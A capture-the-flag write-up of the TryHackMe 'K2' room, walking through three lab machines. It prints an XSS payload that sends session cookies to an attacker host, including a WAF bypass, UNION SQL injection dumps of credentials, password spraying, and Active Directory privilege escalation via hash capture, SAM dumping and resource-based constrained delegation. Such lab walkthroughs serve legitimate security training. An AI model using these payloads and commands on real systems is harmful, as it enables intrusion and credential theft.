---
date: 2024-10-24T14:16:05-05:00
# description: ""
image: "/images/THM-K2/K2.png"
showTableOfContents: true
tags: ["TryHackMe"]
categories: ["Writeups"]
title: "THM: K2"
type: "post"
---

* Platform: TryHackMe
* Link: [K2](https://tryhackme.com/r/room/k2room)
* Level: Hard
* OS: Linux and Windows (The room has three different machines)
---

# Base Camp

The Base Camp machine in the K2 challenge starts with a basic website. Initial enumeration reveals two subdomains linked to a ticketing system, one of which is vulnerable to Cross-Site Scripting (XSS). Using XSS, we steal a session cookie to access the admin dashboard, which is also susceptible to SQL injection. This flaw allows us to retrieve admin credentials, granting initial access. For privilege escalation, membership in the `adm` group permits reading system logs, where we uncover the root password.

## Scanning (Base Camp)

Use the IP address provided and update the `/etc/hosts` with `k2.thm`.

```
./nmap_scan.sh k2.thm K2
```

**Results**

```shell
Running detailed scan on open ports: 22,80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-09 13:00 CDT
Nmap scan report for k2.thm (10.10.81.60)
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fb:52:02:e8:d9:4b:83:1a:52:c9:9c:b8:43:72:83:71 (RSA)
|   256 37:94:6e:99:c2:4f:24:56:fd:ac:77:e2:1b:ec:a0:9f (ECDSA)
|_  256 8f:3b:26:92:67:ec:cc:05:30:27:17:c5:df:9a:42:d2 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Dimension by HTML5 UP
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.15 seconds
```

We find two open ports 22 and 80.

## What is the user flag?

### Enumeration

At `http://k2.thm` we find a website for a company providing IT services.

![K2 base camp website](/images/THM-K2/k2_tryhackme_website.png)

The different pages don't offer anything exploitable and the contact page returns a `HTTP 405 error`.

![K2 base camp 405 error](/images/THM-K2/HTTP-405.png)

Trying some directory brute forcing does not yield anything valuable.

```
gobuster dir -u http://k2.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![K2 base camp gobuster cmd](/images/THM-K2/gobuster_k2.png)

On the contrary we discover two different subdomains with ffuf.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://k2.thm -H "Host: FUZZ.k2.thm" -ic -fs 13229
```

![K2 base camp subdomains](/images/THM-K2/k2_subdomains.png)

There is a login page for a ticketing system at `http://it.k2.thm/`.

![K2 base camp IT domain](/images/THM-K2/k2_it_subdomain.png)

A few directories are found by gobuster for this subdomain.

```
gobuster dir -u http://it.k2.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![IT subdomain hidden directories](/images/THM-K2/it_subdomain_gobuster.png)

The same system has a login page for the Admin at `http://admin.k2.thm/`.

![Admin subdomain](/images/THM-K2/k2_admin_subdomain.png)

This subdomain has the same directories minus `register`.

```
gobuster dir -u http://admin.k2.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![Admin subdomain hidden directories](/images/THM-K2/subdomain_admin_gobuster.png)

The tickets submitted at `http://it.k2.thm/` are viewable at `http://admin.k2.thm/`. 

After creating an account we submit a few tickets but lack the credentials to access the admin page. Since the application is accepting user input let's test for XSS. 

We intercept the request after submitting a ticket and modify it. We will also use two different payloads to determine which field is vulnerable.

```
<script src="http://YOUR_IP:PORT_NUMBER/title.txt"></script>
<script src="http://YOUR_IP:PORT_NUMBER/description.txt"></script>
```

![XSS test](/images/THM-K2/XSS_test.png)

After sending the request, we get confirmation on our web server that the `description` field is vulnerable.

![XSS validated](/images/THM-K2/desc_vulneratble_XSS.png)

Furthermore, there is a session cookie in the request and after digging for more information, we learn that neither the `HttpOnly` nor the `Secure` flags are set on it. This all points to the possibility of cookie stealing.

![Cookie with no secure flags](/images/THM-K2/cookie_no_flags.png)

Let's use the payload below.

```
<script>var i=new Image(); i.src="http://IP:PORT/?cookie="+btoa(document.cookie);</script>
```

![Cookie stealing via XSS](/images/THM-K2/cookie_stealing_XSS_payload.png)

Unfortunately for us, it gets blocked by the WAF (Web Application Firewall).

![WAF message](/images/THM-K2/WAF_message.png)

After multiple tries, we successfully bypass the WAF by using string concatenation.

```
<script>var i=new Image(); var c = "do" + "cument" + "." + "cookie"; i.src="http://YOUR_IP:PORT_NUMBER/?cookie="+btoa(eval(c));</script>
```

![WAF bypass payload](/images/THM-K2/XSS_payload_bypass_WAF.png)

On our web server, we receive the cookie value although we still have to decode it with the command below.

```
echo "CCOKIE_VALUE" | base64 -d
```

![base64 cookie value](/images/THM-K2/cookie_value_base64.png)

After using it on the `admin` subdomain and reloading the page, we now have access to the dashboard at `http://admin.k2.thm/dashboard` where we find three tickets.

> You will not be automatically redirected to the admin dashboard.

![Admin dashboard access](/images/THM-K2/admin_dashboard_access.png)

We can filter the tickets based on the title we provide. It is safe to assume that they are stored in a database. So our next step is to attempt a SQL injection.

We intercept the request and notice only one parameter (`title`).

![Admin dashboard request](/images/THM-K2/admin_dashboard_request.png)

Replacing the value of `title` with `'` (single quote) leads to a 500 error which is often a good sign of SQL injection possibility.

![SQLi test K2 basecamp](/images/THM-K2/k2_SQLi_test.png)

Let's store the request in a file and use it with SQLmap.

> Change the value of `title` back to `test`.

```
sqlmap -r request.txt
```

![SQLmap exploitation](/images/THM-K2/sqli_blocked.png)

Once again the WAF is stopping our exploitation, the same way it was doing it for the XSS attack. It is probably possible to get around it in SQLmap but that's above my pay grade at the moment. However, we can try to exploit it manually.

We can grab a plethora of SQLi payloads [here](https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/detect/Generic_SQLI.txt) and use them with the `Intruder` feature of Burp Suite.

![Burp Intruder SQLi](/images/THM-K2/Intruder_burp.png)

In the `Payloads` sub-section we paste the list we got from Github, and for `Payload processing` we use `URL encoded all the characters`.

![Burp Intruder SQLi settings](/images/THM-K2/intruder_payload_settings.png)

As I was expected they all get blocked by the WAF, again.

![SQLI payloads blocked with Intruder](/images/THM-K2/SQLi_payloads_blocked.png)

Those where simple/generic SQLi payloads. Let's start from the `'` we used earlier and work from there. This time we can attempt some UNION attacks.

First in order to find out the number of columns, we will send some payloads with `Intruder` and find at which point we do not get an error.

```SQL
' UNION SELECT NULL; --
' UNION SELECT NULL, NULL; --
' UNION SELECT NULL, NULL, NULL; --
' UNION SELECT NULL, NULL, NULL, NULL; --
' UNION SELECT NULL, NULL, NULL, NULL, NULL; --
' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL; --
' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL; --
' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL; --
```

![Union SQLi payloads](/images/THM-K2/UNION_SQLi_payloads.png)

After running our attack, we find out that `' UNION SELECT NULL, NULL, NULL; --` is a working payload which means that three columns are expected.

![Union SQLi successful payload](/images/THM-K2/UNION_SQLi_working_payload.png)

Let's test it and try finding the running version of the database.

```SQL
' UNION SELECT NULL, NULL, @@VERSION; --
```

![SQLi db version](/images/THM-K2/SQLi_db_version.png)

We are successful and find version `8.0.33-0ubuntu0.20.04.2`. Next we need to know which database we are currently in.

```SQL
' UNION SELECT NULL, NULL, database(); --
```

We are in the `Ticket Review` database.

![Ticket review database](/images/THM-K2/Ticket_review_db.png)

Now let's list the names of all the tables in that database.

```SQL
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema = database(); --
```

And here are our three tables! `admin_auth`, `auth_users`, and `tickets`.

![Tables list in Ticket Reviiew DB](/images/THM-K2/tables_list_k2.png)

Let's check the content of `admin_auth`. 

```SQL
' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name = 'admin_auth'; -- 
```

We discover four columns in the `admin_auth` table which are: `id`, `admin_username`, `admin_password`, and `email`.

![admin_auth columns](/images/THM-K2/admin_auth_columns.png)

Now we retrieve some credentials from `admin_username` and `admin_password`.

```SQL
' UNION SELECT NULL, admin_username, admin_password FROM admin_auth; --
```

Various admin credentials are found, the first ones being: `james:Pwd@9tLNrC3!`.

```
james:Pwd@9tLNrC3!
rose:VrMAogdfxW!9
bob:PasSW0Rd321
steve:St3veRoxx32
cait:PartyAlLDaY!32
xu:L0v3MyDog!3!
ash:PikAchu!IshoesU!
```

![admin credentials](/images/THM-K2/SQLi_admin_creds.png)

### Initial Foothold (shell as james)

With `james:Pwd@9tLNrC3!` we are able to login via SSH and from there we can read the user flag.

![user flag for K2-basecamp](/images/THM-K2/user_flag_basecamp_k2.png)

## What is the root flag?

Trying to login with the other credentials fail. After running `id` we notice that `james` is part of the `adm` group.

![adm group membership](/images/THM-K2/adm_group.png)

On [this HackTricks page](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#lxc-lxd-group) we learn that the members of the `adm` group usually have "permissions to read log files located inside /var/log/".

![adm group info](/images/THM-K2/adm_group_info.png)

In order to comb through the mountain of logs let's use a grep command.

```
grep -ir "password"
```

* **-i** for case insensitivity, grep will find matches regardless of whether the letters are uppercase or lowercase.
* **-r** to recursively search through directories and their subdirectories.

In `nginx/access.log.1` we find a login attempt from the user `rose` with the password `RdzQ7MSKt)fNaz3!`.

![Rose password](/images/THM-K2/rose_pwd.png)

But using this password with `su rose` fails!

![switch to user rose failure](/images/THM-K2/su_rose_failure.png)

### Privilege Escaltion

Let's try this password against all the users on the system.

> The usernames were gathered from the `/etc/passwd` file.

```
hydra -L k2_users.txt -p 'RdzQ7MSKt)fNaz3!' ssh://k2.thm
```

It turns out that this password belongs to the root account.

![root account credentials](/images/THM-K2/ssh_root_creds.png)

With `root:RdzQ7MSKt)fNaz3!` we login via SSH and recover the root flag.

![root flag for K2-basecamp](/images/THM-K2/root_flag_basecamp_k2.png)


## What are the usernames and passwords that had access to the server?

The usernames we gathered from `/etc/passwd` and their respective passwords are below.

```
james:Pwd@9tLNrC3!,root:RdzQ7MSKt)fNaz3!,rose:vRMkaVgdfxhW!8
```

## Two users have their full names on display. What are their names?

From `/etc/passwd`

![users full names](/images/THM-K2/users_full_names.png)

`James Bold, Rose Bud`.

We can now move on to the next machine, Middle Camp.

# Middle Camp

The Middle Camp machine in K2 is a Domain Controller without a web server. Leveraging credentials from the previous machine, we gain access via RPC. On the system, two notes about password policies partially reveal a user's password, using a custom Bash script we recover the complete password. With Bloodhound, we identify a group with `GenericAll` permissions on another account, allowing us to change that account's password and escalate. The new user, a member of `Backup Operators`, enables us to read the root flag, and we use `SeBackupPrivilege` to access registry hives and retrieve the administrator's hash.

## Scanning (Middle Camp)

Update the `/etc/hosts` file with the IP address of the new machine for `k2.thm`, and scan it.

```
sudo nmap -sC -sV -oA nmap/k2_MC k2.thm
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 11:38 CDT
Nmap scan report for k2.thm (10.10.70.233)
Host is up (0.19s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-16 16:38:36Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-10-16T16:39:27+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=K2Server.k2.thm
| Not valid before: 2024-10-15T16:07:29
|_Not valid after:  2025-04-16T16:07:29
| rdp-ntlm-info: 
|   Target_Name: K2
|   NetBIOS_Domain_Name: K2
|   NetBIOS_Computer_Name: K2SERVER
|   DNS_Domain_Name: k2.thm
|   DNS_Computer_Name: K2Server.k2.thm
|   DNS_Tree_Name: k2.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2024-10-16T16:38:47+00:00
Service Info: Host: K2SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-10-16T16:38:50
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.21 seconds
```

This time we are dealing with a Domain Controller. There is no web server, this target is all Active Directory.

We note the computer name `K2Server.k2.thm` which we add to the `/etc/hosts` file.

## What is the user flag?

### Enumeration

From the previous machine we know that the users with access to the server are `James Bold` and `Rose Bud`. SInce we are in an AD environment let's try to find some valid domain usernames. They usually follow a certain pattern so here is a list of possible AD usernames.

```
James
Rose
James Bold
Rose Bud
j.bold
james.bold
bold.j
r.bud
rose.bud
bud.r
```

> We only have two users in this case so we can generate the different combinations pretty easily. When we need to do the same for a lot of users we can use a tool like [username-anarchy](https://github.com/urbanadventurer/username-anarchy).

And let's add to that all the passwords we currently have. 

```
Pwd@9tLNrC3!
RdzQ7MSKt)fNaz3!
vRMkaVgdfxhW!8
```

#### NetExec Method

With the list of potential users and our passwords list from the previous machine we can enumerate users.

```
netexec smb K2Server.k2.thm -u potential_AD_users.txt -p found_pwds.txt
```

![netexec AD enumeration](/images/THM-K2/valid_creds_k2AD.png)

The credentials `r.bud:vRMkaVgdfxhW!8` are found to be valid!

> Keep in mind that using netexec for AD enumeration **will not work if null authentication is disabled**. This is because we would need to provide valid credentials (username and password) to authenticate with the SMB services to perform the enumeration.

#### Kerbrute Method

Kerbrute can also be used to find the valid usernames.

```
./kerbrute userenum --dc K2Server.k2.thm -d k2.thm potential_AD_users.txt 
```

![kerbrute AD enumeration](/images/THM-K2/k2_valid_AD_usernames.png)

We can then spray our found passwords against the users.

```
./kerbrute bruteuser --dc K2Server.k2.thm -d k2.thm found_pwds.txt j.bold

./kerbrute bruteuser --dc K2Server.k2.thm -d k2.thm found_pwds.txt r.bud
```

![kerbrute credentials brute forcing](/images/THM-K2/rose_bud_kerbrute.png)

> Kerbrute will work regardless of whether null authentication is enabled or disabled. It is designed to brute-force usernames or passwords against a **Kerberos authentication** service.

## Initial Foothold (shell as rose)

With the valid credentials we login with evil-winrm.

```
evil-winrm -i k2.thm -u r.bud -p "vRMkaVgdfxhW\!8"
```

![K2-Middle Camp foothold](/images/THM-K2/foothold_k2MC.png)

In `C:\Users\r.bud\Documents` we find two txt files: `notes.txt` and `note_to_james.txt`.

![notes content](/images/THM-K2/rbud_notes_content.png)

This is an exchange about some password compliance. James added two characters to his previous password which was `rockyou` in order to meet the criteria.

From that we know that James' password is **9** characters long and includes `rockyou`, a special character and a number.

Let's use a Bash script to generate some passwords.

```bash
#!/bin/bash

special_characters=('!' '@' '#' '$' '%' '^' '&' '*')
numbers=(0 1 2 3 4 5 6 7 8 9)

output_file="james_passwords.txt"

> "$output_file"

for special in "${special_characters[@]}"; do
    for number in "${numbers[@]}"; do
    
        echo "${special}${number}rockyou" >> "$output_file"
        
        echo "${number}${special}rockyou" >> "$output_file"
        
        echo "rockyou${number}${special}" >> "$output_file"
        
        echo "rockyou${special}${number}" >> "$output_file"
    done
done

echo "Password list generated in $output_file"
```

We can then use that list against the valid username `j.bold`.

```
./kerbrute bruteuser --dc K2Server.k2.thm -d k2.thm james_passwords.txt j.bold
```

![j.bold credentials found](/images/THM-K2/jbold_pwd_found.png)

We find the valid credentials `j.bold:#8rockyou`. Still we are unable to login via evil-winrm for james because his `Remote Access` was removed.

We can confirm this with the outputs of `net user r.bud` and `net user j.bold`. Rose Bud is part of the `Remote Management Use` group.

![rose group memberships](/images/THM-K2/rosebud_remote_access.png)

But James Bold is not.

![j.bold group memberships](/images/THM-K2/jbold_no_remote_access.png)

Let's run Bloodhound with the credentials for Rose Bud.

```
bloodhound-python -c all -u r.bud -p 'vRMkaVgdfxhW!8' -d k2.thm -dc K2Server.k2.thm -ns 10.10.70.233
```

![bloodhound-python command](/images/THM-K2/rose_bud_bloodhound_py.png)

Start the database

```
sudo neo4j start
```

Launch Bloodhound

```
bloodhound --no-sandbox
```

Under the `Analysis` section we select `Find Shortest Paths to Domain Admins`.

We discover that the members of the `IT STAFF 1` (which James is part of) have the `GenericAll` permission on `J.SMITH`.

![IT STAFF 1 members - GenericAll permission](/images/THM-K2/jbold_GenericAll.png)

We right click on the `GenericAll` thread, select `Help` and under `Linux Abuse` we read that we can change the password of the user.

![ForceChangePassword command](/images/THM-K2/ForceChangePassword.png)

```
net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```

![jsmith password change](/images/THM-K2/jsmith_pwd_change.png)

### Lateral Movement (shell as j.smith)

We then login with evil-winrm and recover the user flag on the Desktop.

```
evil-winrm -i k2.thm -u j.smith -p "Paswword#@2024"
```

![jsmith login](/images/THM-K2/jsmith_login.png)

## What are the usernames found on the server?

The usernames found are:

```
j.bold,j.smith,r.bud
```

## What is the root flag?

Back on Bloodhound, we notice that `J.SMITH` is part of the `Backup Operators` group.

![jsmith Backup Operators membership](/images/THM-K2/JSMITH_backup_operators.png)

![Backup Operators group info](/images/THM-K2/Backup_Operators_AD_info.png)
_[Source](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#backup-operators)_

On [this HackTricks page](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators), we find two different methods to abuse the membership to the `Backup Operators` group. The first method `Local Attack` will help us get the root flag.

1. We need to transfer two necessary dll files: `SeBackupPrivilegeUtils.dll` and `SeBackupPrivilegeCmdLets.dll`. They are available at [this Github](https://github.com/giuliano108/SeBackupPrivilege) repo.

After cloning the repo we send the files to the target via our evil-winrm shell.

```
upload /home/kscorpio/Machines/TryHackMe/K2/K2_Middle_Camp/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll

upload /home/kscorpio/Machines/TryHackMe/K2/K2_Middle_Camp/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
```

![DLL file uploads](/images/THM-K2/DLLs_uploads.png)

2. Import the libraries

```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

![Import DLL](/images/THM-K2/Import_DLLs.png)

3. We can now access and copy files located in restricted directories

```
cd C:\Users\Administrator\

Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt C:\Users\j.smith\Documents\root.txt -Overwrite
```

4. With the commands above we will copy the root flag in `C:\Users\j.smith\Documents`

![Read Rood flag](/images/THM-K2/root_flag_k2MC.png)


## What is the Administrator's NTLM hash?

### Privilege Escalation

![SeBackUpPriv](/images/THM-K2/SeBackUpPriv.png)

Because of the `SeBackupPrivilege` we can get copies of the SAM and SYSTEM hives.

![SeBackUpPriv information](/images/THM-K2/SeBackupPrivilege_info.png)
_[Source](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges)_

```
reg save hklm\sam C:\Windows\Temp\SAM

reg save hklm\system C:\Windows\Temp\SYSTEM
```

![reghives copy](/images/THM-K2/reghives_copy.png)

We then transfer the hives to our local machine.

```
download C:\Windows\Temp\SAM

download C:\Windows\Temp\SYSTEM
```

With `impacket` we can dump the hashes by using the hives we downloaded.

```
impacket-secretsdump -sam SAM -system SYSTEM local
```

![Admin hash](/images/THM-K2/Admin_hash.png)

Using the `Administrator` hash, we login with evil-winrm.

```
evil-winrm -i k2.thm -u Administrator -H "9545b61858c043477c350ae86c37b32f"
```

Furthermore we can retrieve the administrator password with netexec.

```
netexec smb k2.thm -u Administrator -H "9545b61858c043477c350ae86c37b32f" --dpapi
```

![Admin password](/images/THM-K2/admin_pwd.png)

The credentials are `Administrator:vz0q$i8b4c`.


Next is the final machine for this room, The Summit.

# The Summit

The Summit machine, the final part of the K2 challenge, is also a Domain Controller. Through Active Directory enumeration, we uncover valid credentials, gaining an initial foothold. We then exploit some file misconfigurations related to a `.bat` file to obtain the file owner's password hash, which, once cracked, grants us access to that user account. Bloodhound reveals that this user is part of a group with the `GenericWrite` permission on the Domain Controller, enabling us to perform Resource-Based Constrained Delegation (RBCD). Using this, we retrieve the `Administrator` hash, and recover the root flag.

## Scanning (The Summit)

Update `/etc/hosts` and scan the target.

```
sudo nmap -sC -sV -oA nmap/k2_Summit k2.thm
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 16:56 CDT
Nmap scan report for k2.thm (10.10.124.173)
Host is up (0.19s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-16 21:57:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: K2
|   NetBIOS_Domain_Name: K2
|   NetBIOS_Computer_Name: K2ROOTDC
|   DNS_Domain_Name: k2.thm
|   DNS_Computer_Name: K2RootDC.k2.thm
|   DNS_Tree_Name: k2.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2024-10-16T21:57:30+00:00
|_ssl-date: 2024-10-16T21:58:09+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=K2RootDC.k2.thm
| Not valid before: 2024-10-15T21:52:04
|_Not valid after:  2025-04-16T21:52:04
Service Info: Host: K2ROOTDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-10-16T21:57:33
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.09 seconds
```

The final machine is another Domain Controller with the name of `K2RootDC.k2.thm`.

## What is the user flag?

### Enumeration

We update our list before starting the AD enumeration.

**Possible AD usernames**

```
j.bold
j.smith
r.bud
administrator
```

**Passwords Found**

```
Pwd@9tLNrC3!
RdzQ7MSKt)fNaz3!
vRMkaVgdfxhW!8
#8rockyou
vz0q$i8b4c
```
Let's use `Kerbrute` to find the valid usernames first.

![K2-The Summit AD enumeration](/images/THM-K2/valid_users_k2S.png)

Once again we spray our passwords against the valid users.

```
kerbrute bruteuser --dc K2RootDC.k2.thm -d k2.thm potential_pwds.txt j.smith

kerbrute bruteuser --dc K2RootDC.k2.thm -d k2.thm potential_pwds.txt administrator
```

![JSMITH valid credentials](/images/THM-K2/JSMITH_valid_creds.png)

We find the valid credentials: `j.smith:vz0q$i8b4c`. (This is the admin password from the Middle Camp machine).

> The second command does not find any valid passwords.

### Initial Foothold (shell as j.smith)

We login with evil-winrm as `j.smith` but no user flag yet. None of the different directories for this user have anything interesting.

```
evil-winrm -i k2.thm -u j.smith -p "vz0q$i8b4c"
```

![JSMITH login](/images/THM-K2/k2_Summit_JSMITH_login.png)

In `C:\Scripts` we find a file called `backup.bat`. It executes the following command 

```
copy C:\Users\o.armstrong\Desktop\notes.txt C:\Users\o.armstrong\Documents\backup_notes.txt
```

![Bat file content](/images/THM-K2/bat_file.png)

Checking the permissions on the file and its parent directory, we discover that `j.smith` the user we currently control has full control over `C:/Scripts`.

```
Get-Acl -Path "C:\Scripts\backup.bat"

Get-Acl -Path "C:\Scripts"
```

![File permissions](/images/THM-K2/file_permissions.png)

We can exploit this and get the hash of `o.armstrong`.

1. Set up Responder to catch the hash 

```
sudo responder -I tun0
```

2. Remove the existing `backup.bat` file and create another one of the same name with a different content

```
rm backup.bat

Set-Content -Path "C:\Scripts\backup.bat" -Value 'copy \\YOUR_IP\share\notes.txt C:\Users\o.armstrong\Documents\backup_notes.txt'
```

> Notice the different file sizes (Our malicious bat file is the second one)

![Malicious bat file](/images/THM-K2/backup_file_replace.png)

After a little bit of time we get the hash on Responder.

![o.arnstrong hash](/images/THM-K2/o_amstrong_hash.png)

We crack it with hashcat and recover the password `arMStronG08`.

```
hashcat -a 0 -m 5600 oamstrong_hash.txt /usr/share/wordlists/rockyou.txt
```

![o.arnstrong hash cracked](/images/THM-K2/oamstrong_hash_cracked.png)

### Lateral Movement (shell as o.armstrong)

Using evil-winrm we login as `o.armstrong` and find the user flag.

![o.arnstrong login](/images/THM-K2/oarmstrong_login.png)

The `notes.txt` file alludes to a checklist.

![o.arnstrong notes.txt file](/images/THM-K2/k2_summit_notes_file.png)

## What is the root flag?

### Privilege Escalation

Let's run Bloodhound and try to find some privilege escalation paths.

```
bloodhound-python -c all -u j.smith -p 'vz0q$i8b4c' -d k2.thm -dc K2RootDC.k2.thm -ns 10.10.124.173
```

Start the database and launch Bloodhound.

```
sudo neo4j start

bloodhound --no-sandbox
```

`o.armstrong` is part of the `IT DIRECTOR` group and its members have the `GenericWrite` permission on the DC. We can exploit that permission via resource-based constrained delegation (RBCD). 

![o.arnstrong IT DIRECTOR MEMBERSHIP](/images/THM-K2/IT_Director_membership.png)

![IT DIRECTOR GenericWrite permission](/images/THM-K2/GenericWrite_Perm.png)

> **Resource-Based Constrained Delegation (RBCD)** is a way in which a service on one machine in a Windows domain can act on behalf of a user when accessing resources on another machine. It's part of Kerberos authentication, commonly used in Active Directory environments. _Read more about it [here](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)_.


1. Create a computer account in the domain

```
impacket-addcomputer -computer-name 'KSCORPIO$' -computer-pass 'LETSgetr00t!' -dc-host K2RootDC.k2.thm -domain-netbios k2.thm k2.thm/o.armstrong:'arMStronG08'
```

![RBCD step 1](/images/THM-K2/RBCD1.png)


2. Modify `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the DC to include our newly created computer object in order to allow impersonation.

```
impacket-rbcd -delegate-from 'KSCORPIO$' -delegate-to 'K2RootDC$' -dc-ip 10.10.124.173 -action 'write' 'k2.thm/o.armstrong:arMStronG08'
```

![RBCD step 2](/images/THM-K2/RBCD2.png)


3. Obtain a Kerberos ticket while impersonating **Administrator**.

```
impacket-getST -spn 'cifs/K2RootDC.k2.thm' -impersonate Administrator -dc-ip 10.10.124.173 k2.thm/KSCORPIO$:'LETSgetr00t!'
```

![RBCD step 3](/images/THM-K2/RBCD3.png)

4. For Impacket to use our ticket we set an environment variable with our cache file name.

```
export KRB5CCNAME=Administrator@cifs_K2RootDC.k2.thm@K2.THM.ccache
```

5. Dump the NTLM hashes from the DC.

```
impacket-secretsdump 'k2.thm/Administrator@K2RootDC.k2.thm' -k -no-pass -dc-ip 10.10.124.173 -target-ip 10.10.124.173 -just-dc-ntlm
```

![RBCD step 4](/images/THM-K2/RBCD4.png)

With the administrator hash we can login with evil-winrm and read the root flag.

```
evil-winrm -i k2.thm -u Administrator -H "15ecc755a43d2e7c8001215609d94b90"
```

![K2 -Summit root flag](/images/THM-K2/root_flag_K2S.png)


This room was one of the best I have done on TryHackMe so far, I enjoyed its chain-like nature and how the machines were building on top of each other. I will leave some references below if anyone is interested, thank you for taking the time to read this **long** write up!

## References

* [Tib3rius SQLi cheatsheet](https://tib3rius.com/sqli.html)

* TryHackMe have three **free rooms** that will give you a good foundation for SQLi:
	- [SQL Injection](https://tryhackme.com/r/room/sqlinjectionlm)
	- [Advanced SQL Injection](https://tryhackme.com/r/room/advancedsqlinjection)
	- [SQL Injection Lab](https://tryhackme.com/r/room/sqlilab)

* Install Bloodhound with Docker Compose (simpler setup) available [here](https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose#h_01H9MMVW3J42013Q0P68WSRK2R).

* Abusing membership to `Backup Operators`,  access and copy files from restricted directories -> [here](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators).

* Learn what CIFS is (used at step 3 of RBCD) -> [What is CIFS?](https://www.upguard.com/blog/cifs)
